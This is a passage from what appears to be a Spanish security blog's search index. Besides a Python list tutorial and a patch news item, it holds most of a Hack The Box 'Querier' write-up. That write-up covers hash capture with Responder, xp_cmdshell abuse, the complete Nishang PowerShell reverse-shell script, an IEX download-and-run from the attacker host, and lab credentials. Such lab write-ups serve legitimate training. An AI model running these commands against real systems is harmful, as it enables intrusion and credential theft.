[][] lista = [1, [2, [3, 4], 5], 6]lista[1][0]2lista[1][1][3, 4]lista[1][1][0]3 Podemos anidar tantas listas como nuestro sistema soporte Es importante mencionar que si usamos operadores en una lista con sublistas anidadas, estos solo se aplicaran a la primera, no lo haran de forma recursiva, y se deseariamos usarlos debemos aplicar el concepto de indexing lista = [1, [2, [3, 4], 5], 6][3, 4] in listaFalselista[1][2, [3, 4], 5][3, 4] in lista[1]TrueLas listas son mutables: Al contrario que los strings, los elementos de las listassi pueden modificarse lista = [ texto1 ,  texto2 ,  texto3 ]lista[0]'texto1'lista[0] =  texto4 lista['texto4', 'texto2', 'texto3']Si queremos tambien podemos eliminar elementos una lista lista = [ texto1 ,  texto2 ,  texto3 ]del lista[0]lista['texto2', 'texto3']Para realizar estas modificaciones tambien podemos usar los conceptos del indexing, slicing y stride. lista['texto1', 'texto2']lista += [ texto3 ,  texto4 ,  texto5 ]lista['texto1', 'texto2', 'texto3', 'texto4', 'texto5']lista[0:3]['texto1', 'texto2', 'texto3']lista[0:3] = [1, 2, 3]lista[1, 2, 3, 'texto4', 'texto5']Otra cosa interesante es que el numeros de elementos seleccionados no tiene que ser igual a los que se asigne lista[0:3][1, 2, 3]lista[0:3] = [1, 2]lista[1, 2, 'texto4', 'texto5']lista[2:2] = [3, 4, 5]lista[1, 2, 3, 4, 5, 'texto4', 'texto5']lista[0:6] = []lista['texto5']"
    }, {
    "id": 7,
    "url": "http://localhost:4000/novedades/parche-capturadePantalla-windows",
    "title": "Windows 10 y 11 ya tienen parches para las capturas de pantalla",
    "body": "2023/03/28 - Despues que unos investigadores de ciberseguridad habían descubierto un fallo en los móviles Google Pixel y los ordenadores con Windows. Según explicaban, el editor de capturas de pantalla de estos dispositivos mostraba las imágenes completas pese a que los usuarios la recortasen. Segun se confirma se debian realizar ciertos pasos para confirmarlo.  https://twitter. com/wdormann/status/1638235267919233024?ref_src=twsrc%5Etfw Copy an image (to have a backup) Open one with Snipping tool Crop it to make it much smaller Click the Save icon Compare file sizes of cropped and original Wonder about the world that you live inEl fallo permitía que aquellos que recibían las capturas recortadas en PNG pudiesen recuperar parte de la imagen original, dejando visible lo que los usuarios habían querido ocultar. Esto podia ocasinar que se viesen datos sensibles. Ahora, tanto Microsoft como Google, han lanzado unos parches de seguridad para solucionarlo. Por lo tanto, los propietarios de dispositivos Pixel solo tendrán que actualizarlos para evitar recortes de pantalla inservibles. Sin embargo, los de Windows tendrán que dirigirse a Microsoft Store para hacer lo propio, pero con las plataformas y no con el ordenador. "
    }, {
    "id": 8,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Querier",
    "title": "Maquina - Querier",
    "body": "2023/03/28 - El dia de hoy vamos a estar resolviendo la maquina Querier de hackthebox que es una Windows de dificultad Media. Comenzaremos enumerando los recursos compartidos smb para obtener la contraseña de un usuario, informando que puede iniciar sesión en el mssql-server. Para obtener el usuario en el sistema, podemos robar el hash del usuario mssql-svc ejecutando el comando xp_dirtree y finalmente para la escalada de privilegios al administrador que es bastante sencilla aprovecharemos el script powerup. ps1 de powersploit para obtener las credenciales administrativas alojadas en un archivo xml. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Querier❯ ls Querier❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 125PING 10. 10. 10. 125 (10. 10. 10. 125) 56(84) bytes of data. 64 bytes from 10. 10. 10. 125: icmp_seq=1 ttl=127 time=137 ms--- 10. 10. 10. 125 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 137. 483/137. 483/137. 483/0. 000 msVemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 125 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-03-25 14:23 GMTInitiating SYN Stealth Scan at 14:23Scanning 10. 10. 10. 125 [65535 ports]Discovered open port 135/tcp on 10. 10. 10. 125Discovered open port 139/tcp on 10. 10. 10. 125Discovered open port 445/tcp on 10. 10. 10. 125Discovered open port 49664/tcp on 10. 10. 10. 125Discovered open port 49665/tcp on 10. 10. 10. 125Discovered open port 49670/tcp on 10. 10. 10. 125Discovered open port 47001/tcp on 10. 10. 10. 125Discovered open port 49668/tcp on 10. 10. 10. 125Discovered open port 49666/tcp on 10. 10. 10. 125Discovered open port 49667/tcp on 10. 10. 10. 125Discovered open port 1433/tcp on 10. 10. 10. 125Discovered open port 49669/tcp on 10. 10. 10. 125Discovered open port 49671/tcp on 10. 10. 10. 125Discovered open port 5985/tcp on 10. 10. 10. 125Completed SYN Stealth Scan at 14:23, 19. 31s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 125Host is up, received user-set (0. 11s latency). Scanned at 2023-03-25 14:23:13 GMT for 19sNot shown: 65090 closed tcp ports (reset), 431 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE   REASON135/tcp  open msrpc    syn-ack ttl 127139/tcp  open netbios-ssn syn-ack ttl 127445/tcp  open microsoft-ds syn-ack ttl 1271433/tcp open ms-sql-s   syn-ack ttl 1275985/tcp open wsman    syn-ack ttl 12747001/tcp open winrm    syn-ack ttl 12749664/tcp open unknown   syn-ack ttl 12749665/tcp open unknown   syn-ack ttl 12749666/tcp open unknown   syn-ack ttl 12749667/tcp open unknown   syn-ack ttl 12749668/tcp open unknown   syn-ack ttl 12749669/tcp open unknown   syn-ack ttl 12749670/tcp open unknown   syn-ack ttl 12749671/tcp open unknown   syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 19. 47 seconds      Raw packets sent: 95410 (4. 198MB) | Rcvd: 82570 (3. 303MB)Podemos ver puertos interesantes que se encuentran abiertos como 135 rpc , 139 ldap , 445 smb , 1433 mssql y 5985 winrm. Escaneo de Version y Servicios. : ❯ nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10. 10. 10. 125 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-03-25 14:26 GMTNmap scan report for 10. 10. 10. 125Host is up (0. 44s latency). PORT   STATE SERVICE    VERSION135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn445/tcp  open microsoft-ds?1433/tcp open ms-sql-s   Microsoft SQL Server 2017 14. 00. 1000. 00; RTM| ms-sql-ntlm-info: |  Target_Name: HTB|  NetBIOS_Domain_Name: HTB|  NetBIOS_Computer_Name: QUERIER|  DNS_Domain_Name: HTB. LOCAL|  DNS_Computer_Name: QUERIER. HTB. LOCAL|  DNS_Tree_Name: HTB. LOCAL|_ Product_Version: 10. 0. 17763| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-03-25T14:21:57|_Not valid after: 2053-03-25T14:21:57|_ssl-date: 2023-03-25T14:27:31+00:00; -1s from scanner time. 5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found49664/tcp open msrpc     Microsoft Windows RPC49665/tcp open msrpc     Microsoft Windows RPC49666/tcp open msrpc     Microsoft Windows RPC49667/tcp open msrpc     Microsoft Windows RPC49668/tcp open msrpc     Microsoft Windows RPC49669/tcp open msrpc     Microsoft Windows RPC49670/tcp open msrpc     Microsoft Windows RPC49671/tcp open msrpc     Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -1s, deviation: 0s, median: -1s| ms-sql-info: |  10. 10. 10. 125:1433: |   Version: |    name: Microsoft SQL Server 2017 RTM|    number: 14. 00. 1000. 00|    Product: Microsoft SQL Server 2017|    Service pack level: RTM|    Post-SP patches applied: false|_  TCP port: 1433| smb2-time: |  date: 2023-03-25T14:27:20|_ start_date: N/A| smb2-security-mode: |  3. 1. 1: |_  Message signing enabled but not requiredService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 76. 96 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMB   ?       1433   MSSQL-S   Microsoft SQL Server 2017 14. 00. 1000. 00; RTM       5985   WINRM   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)   Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usaremos la herramienta crackmapexec: ❯ crackmapexec smb 10. 10. 10. 125SMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:HTB. LOCAL) (signing:False) (SMBv1:False)Vamos a buscar si hay recursos compartidos a los que podemos acceder, para ello podemos hacer uso de smbmap con los parametros -H para especificar el host y -u para hacer uso de una sesion nula. ❯ smbmap -H 10. 10. 10. 125 -u 'null'[+] Guest session  	IP: 10. 10. 10. 125:445	Name: 10. 10. 10. 125                   	Disk                         	Permissions	Comment	----                         	-----------	-------	ADMIN$                      	NO ACCESS	Remote Admin	C$                        	NO ACCESS	Default share	IPC$                       	READ ONLY	Remote IPC	Reports                      	READ ONLY	Despues de ver que si podemos listar los recursos compartidos, vemos uno interesante con el nombre de Reports vamos a ingresar en el para ver su contenido, añadiremos para eso el parametro ‘-r’ y el nombre del recurso: ❯ smbmap -H 10. 10. 10. 125 -u 'null' -r Reports[+] Guest session  	IP: 10. 10. 10. 125:445	Name: 10. 10. 10. 125                   	Disk                         	Permissions	Comment	----                         	-----------	-------	Reports                      	READ ONLY		. \Reports\*	dr--r--r--        0 Mon Jan 28 23:26:31 2019	. 	dr--r--r--        0 Mon Jan 28 23:26:31 2019	. . 	fr--r--r--      12229 Mon Jan 28 23:26:31 2019	Currency Volume Report. xlsmDentro existe un archivo con la extension xlsm, asi que vamos a descargarnoslo y renombrar el archivo a un nombre mas comodo: ❯ smbmap -H 10. 10. 10. 125 -u 'null' --download  Reports\Currency Volume Report. xlsm [+] Starting download: Reports\Currency Volume Report. xlsm (12229 bytes)[+] File output to: /home/fmiracle/Machines/Querier/content/10. 10. 10. 125-Reports_Currency Volume Report. xlsm❯ ls 10. 10. 10. 125-Reports_Currency Volume Report. xlsm❯ mv 10. 10. 10. 125-Reports_Currency\ Volume\ Report. xlsm Report. xlsm❯ ls Report. xlsmExplotación #: Como es un archivo xlsm trataremos con el comando strings lista del archivo algunos caracteres legibles: ❯ strings Report. xlsm[Content_Types]. xml apP&lt;*Fi+id|}5o=`FhO(%$_rels/. rels BKwAHGJy(vUSh9iAl no ver informacion interesante, vamos a utilizar un herramienta de github llamada olebva:  https://github. com/decalage2/oletools/wiki/olevba. Esta herramienta nos permite analizar archivos OLE y OpenXML, como documentos de MS Office para poder detectar macros en texto claro. Ejecutamos la herramienta pasandole el archivo xlsm y esta nos parsea la informacion donde podemos ver un usario y contraseña: ❯ olevba Report. xlsmolevba 0. 60 on Python 3. 9. 2 - http://decalage. info/python/oletools===============================================================================FILE: Report. xlsmType: OpenXMLWARNING For now, VBA stomping cannot be detected for files in memory-------------------------------------------------------------------------------VBA MACRO ThisWorkbook. cls in file: xl/vbaProject. bin - OLE stream: 'VBA/ThisWorkbook'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ' macro to pull data for client volume reports'' further testing requiredPrivate Sub Connect()Dim conn As ADODB. ConnectionDim rs As ADODB. RecordsetSet conn = New ADODB. Connectionconn. ConnectionString =  Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6 conn. ConnectionTimeout = 10conn. OpenIf conn. State = adStateOpen Then ' MsgBox  connection successful   'Set rs = conn. Execute( SELECT * @@version; ) Set rs = conn. Execute( SELECT * FROM volume; ) Sheets(1). Range( A1 ). CopyFromRecordset rs rs. CloseEnd IfEnd Sub-------------------------------------------------------------------------------VBA MACRO Sheet1. cls in file: xl/vbaProject. bin - OLE stream: 'VBA/Sheet1'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)+----------+--------------------+---------------------------------------------+|Type   |Keyword       |Description                 |+----------+--------------------+---------------------------------------------+|Suspicious|Open        |May open a file               ||Suspicious|Hex Strings     |Hex-encoded strings were detected, may be  ||     |          |used to obfuscate strings (option --decode to||     |          |see all)                   |+----------+--------------------+---------------------------------------------+Vamos a proceder a verificar si las credenciales son validas para ello usaremos crackmapexec: ❯ crackmapexec smb 10. 10. 10. 125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUPSMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)SMB     10. 10. 10. 125  445  QUERIER     [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6 Como tenemos credenciales validas, podemos tratar de conectarnos al servicio mssql que vimos antes, para ello usaremos la herramienta mssqlclient. py que viene incluida en la suite de impacket:  https://github. com/fortra/impacket. Especificamos tal como nos indica el uso de la herramienta el dominio, usuario, contraseña y adicionamos el parametro -windows-auth el cual permite utilizar o no la autenticación de Windows (por defecto False) ❯ mssqlclient. py WORKGROUP/reporting@10. 10. 10. 125 -windows-authImpacket v0. 9. 24 - Copyright 2021 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'volume'. [*] INFO(QUERIER): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands SQL&gt;Una vez conectados al servicio lo que intentaremos hacer es usar xp_cmdshell para tratar de ejecutar comandos, pero vemos que el usuario reporting no cuenta con los privilegios suficientes: SQL&gt; xp_cmdshell 'whoami'[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'whoami'. SQL&gt; sp_configure 'show_advance', 1[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action. SQL&gt; sp_configure 'xp_cmdshell', 1[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option. SQL&gt; sp_configure 'show_advance', 1[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action. SQL&gt; reconfigure[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement. SQL&gt;Probaremos a tratar de lanzar una conexion con el comando xp_dirtree para tratar de realizar una conexion a un recurso compartido que alojare en mi maquina y mientras el servidor trata de auntenticarse a mi maquina, con responder intentare capturar el hash ` Net-NTLMv2`. -] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement. SQL&gt; xp_dirtree  \\10. 10. 16. 4\test subdirectory                                                                                                                              depth  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  -----------  SQL&gt; ❯ responder -I tun0                     __ . ----. -----. -----. -----. -----. -----. --| |. -----. ----.  |  _| -__|__ --| _ | _ |   | _ || -__|  _| |__| |_____|_____|  __|_____|__|__|_____||_____|__|          |__|[+] HTTP Options:      NBT-NS, LLMNR &amp; MDNS Responder 3. 0. 6. 0  Serving EXE        [OFF] Author: Laurent Gaffie (laurent. gaffie@gmail. com) To kill this script hit CTRL-C[+] Poisoning Options:[+] Poisoners:  LLMNR           [ON]  NBT-NS           [ON]  DNS/MDNS          [ON]  Fingerprint hosts     [OFF][+] Servers:  HTTP server        [ON]  HTTPS server        [ON]  WPAD proxy         [OFF]  Auth proxy         [OFF]  SMB server         [ON]  Kerberos server      [ON]  SQL server         [ON]  FTP server         [ON]  IMAP server        [ON]  POP3 server        [ON]  SMTP server        [ON]  DNS server         [ON]  LDAP server        [ON]  RDP server         [ON]  DCE-RPC server       [ON]  WinRM server        [ON][+] HTTP Options:  Always serving EXE     [OFF]  Serving EXE        [OFF]  Serving HTML        [OFF]  Upstream Proxy       [OFF][+] Poisoning Options:  Analyze Mode        [OFF]  Force WPAD auth      [OFF]  Force Basic Auth      [OFF]  Force LM downgrade     [OFF]  Fingerprint hosts     [OFF][+] Generic Options:  Responder NIC       [tun0]  Responder IP        [10. 10. 16. 4]  Challenge set       [random]  Don't Respond To Names   ['ISATAP'][+] Current Session Variables:  Responder Machine Name   [WIN-LBGCELK616Y]  Responder Domain Name   [68T9. LOCAL]  Responder DCE-RPC Port   [49780][+] Listening for events. . . [SMB] NTLMv2-SSP Client  : 10. 10. 10. 125[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc[SMB] NTLMv2-SSP Hash   : mssql-svc::QUERIER:ba540bb74f74294f:4BD001461E512C70BDF3EEB128106707:0101000000000000808ED3322E5FD901A773108D6C1BE5000000000002000800360038005400390001001E00570049004E002D004C0042004700430045004C004B00360031003600590004003400570049004E002D004C0042004700430045004C004B0036003100360059002E0036003800540039002E004C004F00430041004C000300140036003800540039002E004C004F00430041004C000500140036003800540039002E004C004F00430041004C0007000800808ED3322E5FD90106000400020000000800300030000000000000000000000000300000E9065E16CEFD1E276185F5DFA30A232F59D4C33E5CD80DC5D131A1B67AEAE4F60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003400000000000000000000000000Obtuvimos un hash correspondiente al usario mssql-svc el cual trataremos de crackearlo con john: ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuscorporate568   (mssql-svc)1g 0:00:00:37 DONE (2023-03-25 15:30) 0. 02700g/s 241965p/s 241965c/s 241965C/s correforenz. . cornamucklaUse the  --show --format=netntlmv2  options to display all of the cracked passwords reliablySession completedJohn logra obtener la contraseña en texto claro y ahora contamos con nuevas credenciales que podemos probar:  usuario: mssql-svc password: corporate568Volvemos a validar la contraseña con crackmapexecy efectivamente son validas: ❯ crackmapexec smb 10. 10. 10. 125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUPSMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)SMB     10. 10. 10. 125  445  QUERIER     [+] WORKGROUP\mssql-svc:corporate568Ya que ahora disponemos de credenciales del usuario mssql-svc quiero pensar que me puedo conectar con mssqlclient. py y que este contara con mayores privilegios y esta vez si que podremos ejecutar comandos: Password:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'master'. [*] INFO(QUERIER): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commandsSQL&gt; sp_configure 'xp_cmdshell', 1[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option. SQL&gt; sp_configure 'show_advanced', 1[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. SQL&gt; reconfigureSQL&gt; sp_configure 'xp_cmdshell', 1[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. SQL&gt; reconfigureSQL&gt; xp_cmdshell  whoami output                                       --------------------------------------------------------------------------------  querier\mssql-svc                                 NULL                                        SQL&gt;Esta vez si conseguimos ejecutar comandos, lo siguiente sera ganar acceso con una consola en powershell y movernos mas comodamente desde nuestra maquina victima, y para ello usaremos `Invoke-PowerShellTcp. ps1 ` del repositorio de Nishang:  https://github. com/samratashok/nishang. Editaremos la linea final del script y al ejecutarlo con Iex nos interprete el script incluida la linea final de ese modo matamos dos pajaros de un tiro: function Invoke-PowerShellTcp { &lt;#. SYNOPSISNishang script which can be used for Reverse or Bind interactive PowerShell from a target. . DESCRIPTIONThis script is able to connect to a standard netcat listening on a port when using the -Reverse switch. Also, a standard netcat can connect to this script Bind to a specific port. The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy. PARAMETER IPAddressThe IP address to connect to when using the -Reverse switch. . PARAMETER PortThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192. 168. 254. 226 -Port 4444Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Bind -Port 4444Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must belistening on the given IP and port. . LINKhttp://www. labofapenetrationtester. com/2015/05/week-of-powershell-shells-day-1. htmlhttps://github. com/nettitude/powershell/blob/master/powerfun. ps1https://github. com/samratashok/nishang#&gt;     [CmdletBinding(DefaultParameterSetName= reverse )] Param(    [Parameter(Position = 0, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 0, Mandatory = $false, ParameterSetName= bind )]    [String]    $IPAddress,    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= bind )]    [Int]    $Port,    [Parameter(ParameterSetName= reverse )]    [Switch]    $Reverse,    [Parameter(ParameterSetName= bind )]    [Switch]    $Bind  )    try   {    #Connect back if the reverse switch is used.     if ($Reverse)    {      $client = New-Object System. Net. Sockets. TCPClient($IPAddress,$Port)    }    #Bind to the provided port if Bind switch is used.     if ($Bind)    {      $listener = [System. Net. Sockets. TcpListener]$Port      $listener. start()        $client = $listener. AcceptTcpClient()    }     $stream = $client. GetStream()    [byte[]]$bytes = 0. . 65535|%{0}    #Send back current username and computername    $sendbytes = ([text. encoding]::ASCII). GetBytes( Windows PowerShell running as user   + $env:username +   on   + $env:computername +  `nCopyright (C) 2015 Microsoft Corporation. All rights reserved. `n`n )    $stream. Write($sendbytes,0,$sendbytes. Length)    #Show an interactive PowerShell prompt    $sendbytes = ([text. encoding]::ASCII). GetBytes('PS ' + (Get-Location). Path + '&gt;')    $stream. Write($sendbytes,0,$sendbytes. Length)    while(($i = $stream. Read($bytes, 0, $bytes. Length)) -ne 0)    {      $EncodedText = New-Object -TypeName System. Text. ASCIIEncoding      $data = $EncodedText. GetString($bytes,0, $i)      try      {        #Execute the command on the target.         $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )      }      catch      {        Write-Warning  Something went wrong with execution of command on the target.           Write-Error $_      }      $sendback2 = $sendback + 'PS ' + (Get-Location). Path + '&gt; '      $x = ($error[0] | Out-String)      $error. clear()      $sendback2 = $sendback2 + $x      #Return the results      $sendbyte = ([text. encoding]::ASCII). GetBytes($sendback2)      $stream. Write($sendbyte,0,$sendbyte. Length)      $stream. Flush()     }    $client. Close()    if ($listener)    {      $listener. Stop()    }  }  catch  {    Write-Warning  Something went wrong! Check if the server is reachable and you are using the correct port.       Write-Error $_  }}Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 16. 4 -Port 443Seguidamente procedemos a montarnos un servidor local con python donde alojaremos el script Invoke-PowerShellTcp. ps1: ❯ ls Invoke-PowerShellTcp. ps1  Report. xlsm❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . Ejecutamos la instruccion con xp_cmdshell: SQL&gt; xp_cmdshell  powershell IEX(New-Object Net. WebClient). downloadString(\ http://10. 10. 16. 4/Invoke-PowerShellTcp. ps1\ ) Nos ponemos en escucha con ncat en puerto 443 y ganamos acceso al sistema: ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 125. Ncat: Connection from 10. 10. 10. 125:49681. Windows PowerShell running as user mssql-svc on QUERIERCopyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\Windows\system32&gt;whoamiquerier\mssql-svcPS C:\Windows\system32&gt;AHora vamos al directorio personal del usuario y visializamos la primera flag user. txt: PS C:\Windows\system32&gt;cd C:\Users\PS C:\Users&gt; dir  Directory: C:\UsersMode        LastWriteTime     Length Name                                 ----        -------------     ------ ----                                 d-----    1/28/2019 10:17 PM        Administrator                             d-----    1/28/2019 11:42 PM        mssql-svc                               d-r---    1/28/2019 10:17 PM        Public                                PS C:\Users&gt; cd mssql-svcPS C:\Users\mssql-svc&gt; cd DesktopPS C:\Users\mssql-svc\Desktop&gt; type user. txt089b86d375c2a51f4aae02b9a984a9eeEscalada de Privilegios #: Una vez dentro ejecutamos el comando whoami /priv y vemos que tenemos activado el SeImpersonatePrivilege PS C:\Windows\system32&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name        Description                State  ============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token       DisabledSeIncreaseQuotaPrivilege   Adjust memory quotas for a process    DisabledSeChangeNotifyPrivilege    Bypass traverse checking         Enabled SeImpersonatePrivilege    Impersonate a client after authentication Enabled SeCreateGlobalPrivilege    Create global objects           Enabled SeIncreaseWorkingSetPrivilege Increase a process working set      DisabledPodriamos utilizar JuicyPotato, pero esta vez vamos a usar PowerUp. ps1 de powersploit para enumerar el sistema. Nos volvemos a compartir un servidor web con python3: ❯ ls Invoke-PowerShellTcp. ps1  PowerUp. ps1  Report. xlsm❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . y ejecutamos con Iex la instraccion para ejecutar e interpretar el script en la maquina victima y hacer un reconocimiento total: PS C:\Windows\system32&gt; Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 4/PowerUp. ps1')Una vez ejecutado esperamos un poco y el sistema nos enumera unas credenciales Administrativas del archivo Groups. xml. PS C:\Windows\system32&gt; Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 4/PowerUp. ps1')Privilege  : SeImpersonatePrivilegeAttributes : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLEDTokenHandle : 2468ProcessId  : 3744Name    : 3744Check    : Process Token PrivilegesServiceName  : UsoSvcPath     : C:\Windows\system32\svchost. exe -k netsvcs -pStartName   : LocalSystemAbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'CanRestart  : TrueName     : UsoSvcCheck     : Modifiable ServicesModifiablePath  : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsAppsIdentityReference : QUERIER\mssql-svcPermissions    : {WriteOwner, Delete, WriteAttributes, Synchronize. . . }%PATH%      : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsAppsName       : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsAppsCheck       : %PATH% . dll HijacksAbuseFunction   : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl. dll'UnattendPath : C:\Windows\Panther\Unattend. xmlName     : C:\Windows\Panther\Unattend. xmlCheck    : Unattended Install FilesChanged  : {2019-01-28 23:12:48}UserNames : {Administrator}NewName  : [BLANK]Passwords : {MyUnclesAreMarioAndLuigi!!1!}File   : C:\ProgramData\Microsoft\Group       Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups. xmlCheck   : Cached GPP FilesVamos a proceder a validar si las credenciales corresponden al usuario Administrador y efectivamente asi es: ❯ crackmapexec smb 10. 10. 10. 125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUPSMB     10. 10. 10. 125  445  QUERIER     [*] Windows 10. 0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)SMB     10. 10. 10. 125  445  QUERIER     [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)Ahora podemos hacer uso del puerto 5985 servicio de administracion remota de windows con la ayuda de evil-winrm nos dirigimos al directorio del usuario Administrator y podemos visualiar la segunda flag root. txt :). ❯ evil-winrm -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -i 10. 10. 10. 125Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS 